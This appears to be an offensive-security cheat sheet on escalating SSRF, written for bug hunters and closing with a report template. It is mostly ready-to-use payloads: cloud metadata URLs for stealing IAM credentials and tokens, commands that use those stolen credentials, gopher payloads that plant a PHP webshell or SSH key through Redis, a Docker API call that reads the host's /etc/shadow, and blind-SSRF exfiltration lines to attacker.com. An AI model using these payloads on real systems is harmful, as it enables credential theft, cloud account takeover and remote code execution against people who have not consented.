---
tags:
  - critical
  - server-side
---

# SSRF Escalation

You have SSRF. Now maximize impact.

---

## Cloud Metadata

### AWS EC2 (IMDSv1)

**No authentication required - just GET requests**

```bash
# Instance info
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4

# Identity document (JSON)
http://169.254.169.254/latest/dynamic/instance-identity/document

# IAM Role discovery
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Credential extraction (replace ROLE-NAME)
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]

# User data (often contains secrets/scripts)
http://169.254.169.254/latest/user-data
```

**Credential Response Format:**
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2025-02-05T18:34:56Z"
}
```

**Use stolen credentials:**
```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
aws iam list-users
```

**Impact:** IAM credentials → AWS account compromise

### AWS IMDSv2 (Token Required)

Requires PUT + custom headers (harder to exploit):

```bash
# Step 1: Get token (PUT request needed)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

**IMDSv2 Bypass attempts:**
- Need SSRF that allows PUT + custom headers
- Hop limit = 1 (blocks container access)
- Blocks X-Forwarded-For header

### AWS ECS Containers

```bash
# Credentials via container endpoint
http://169.254.170.2/v2/credentials/[GUID]

# GUID from environment variable
file:///proc/self/environ
# Look for: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

### AWS Lambda

```bash
# Credentials in environment variables
file:///proc/self/environ
# Variables: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN

# Event data
http://localhost:9001/2018-06-01/runtime/invocation/next
```

---

### Google Cloud Platform (GCP)

**Requires header: `Metadata-Flavor: Google`** (Use redirect to bypass)

```bash
# Project info
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id

# Instance info
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/zone

# Service account token (HIGH VALUE)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# List service accounts
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

# Kubernetes config
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
```

**Beta API (no header required - legacy):**
```bash
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

**Use GCP token:**
```bash
export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
gcloud projects list
```

---

### Microsoft Azure

**Requires header: `Metadata: true`**

```bash
# Instance info
http://169.254.169.254/metadata/instance?api-version=2021-12-13

# Management token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://management.azure.com/

# Graph token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://graph.microsoft.com/

# Key Vault token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://vault.azure.net/

# User data
http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text
```

**Legacy endpoint (no header):**
```bash
http://169.254.169.254/metadata/v1/instanceinfo
```

### Azure App Services/Functions

```bash
# Check environment
echo $IDENTITY_ENDPOINT
echo $IDENTITY_HEADER

# Get tokens
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
```

---

### Other Cloud Providers

**DigitalOcean** (169.254.169.254)
```bash
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/user-data
```

**Alibaba Cloud** (100.100.100.200) - *Often bypasses private IP filters!*
```bash
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/[ROLE-NAME]
```

**Oracle Cloud** (169.254.169.254 or 192.0.0.192)
```bash
http://169.254.169.254/opc/v1/instance/
http://192.0.0.192/latest/meta-data/
```

**Kubernetes** (internal)
```bash
https://kubernetes.default.svc/api/v1/secrets
https://kubernetes.default.svc/api/v1/namespaces/default/pods
# Token: /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

## Metadata Header Bypass via Redirect

For GCP/Azure that require headers:

```python
# Redirect server that adds required headers
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/gcp')
def gcp():
    return redirect('http://metadata.google.internal/computeMetadata/v1/', code=302)
```

---

## Internal Services → RCE

### Redis → RCE

If Redis is accessible without auth:

```bash
# Write webshell
gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%0D%0ACONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0A

# Write SSH key
gopher://127.0.0.1:6379/_SET%20ssh%20%22%5Cn%5Cnssh-rsa%20AAAA...%20user%40host%5Cn%5Cn%22%0D%0ACONFIG%20SET%20dir%20%2Froot%2F.ssh%0D%0ACONFIG%20SET%20dbfilename%20authorized_keys%0D%0ASAVE%0D%0A
```

### Memcached → Cache Poisoning

```bash
# Set arbitrary cache value
dict://127.0.0.1:11211/set%20key%200%20600%205%0D%0Avalue%0D%0A
```

### Docker API → Container Escape

```bash
# List containers
http://127.0.0.1:2375/containers/json

# Create malicious container with host mount
POST http://127.0.0.1:2375/containers/create
{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "cat /host/etc/shadow > /tmp/shadow"],
  "Binds": ["/:/host"]
}
```

### FastCGI → RCE

```bash
# Use gopherus to generate payload
python gopherus.py --exploit fastcgi /var/www/html/index.php

# Payload executes PHP code via FastCGI
```

### Internal Admin Panels

```bash
# Jenkins
http://127.0.0.1:8080/script

# Tomcat Manager
http://127.0.0.1:8080/manager/html

# Solr
http://127.0.0.1:8983/solr/admin/cores

# Zabbix
http://127.0.0.1/zabbix/

# Kibana
http://127.0.0.1:5601/
```

---

## Chaining SSRF

### SSRF → AWS Takeover

1. SSRF to metadata endpoint
2. Retrieve IAM credentials
3. Use AWS CLI with stolen creds
4. Enumerate permissions, escalate

### SSRF → Internal App Takeover

1. SSRF to internal admin panel
2. Find auth bypass or default creds
3. Create admin user or extract data

### Blind SSRF → Data Exfil

If you can only trigger requests but not see responses:

```bash
# DNS exfiltration
?url=http://$(whoami).attacker.com

# Via webhook
?url=http://attacker.com/log?data=INTERNAL_DATA
```

---

## Real-World Examples

| Company | Technique | Impact |
|---------|-----------|--------|
| Capital One | WAF SSRF → AWS metadata | 100M records breached |
| DuckDuckGo | Image proxy SSRF | Full AWS metadata |
| GitLab | DNS rebinding | IAM credentials |
| Shopify | SSRF in testing env | GCP metadata attempted |

**GitLab DNS Rebinding Example:**
```
1. First resolution: evil.com → 8.8.8.8 (passes check)
2. Second resolution: evil.com → 169.254.169.254 (actual request)
```

---

## Impact Table

| Scenario | Severity |
|----------|----------|
| Blind SSRF, external only | Low |
| Port scan internal network | Medium |
| Read internal services | Medium-High |
| Access cloud metadata | High |
| Retrieve IAM credentials | Critical |
| RCE via internal service | Critical |

---

## Tools

- **PACU** - AWS exploitation framework
- **ScoutSuite** - Multi-cloud security auditing
- **Prowler** - AWS security assessment

---

## PoC Template

```markdown
## Summary
SSRF in [endpoint] allows access to internal services and AWS metadata.

## Steps
1. Send request to vulnerable endpoint
2. Change URL parameter to internal target
3. Observe response with internal data

## Impact
Attacker can:
- Access AWS IAM credentials
- Read internal configuration
- [Specific impact based on what you found]

## Proof
[Screenshot of metadata/internal response]
```
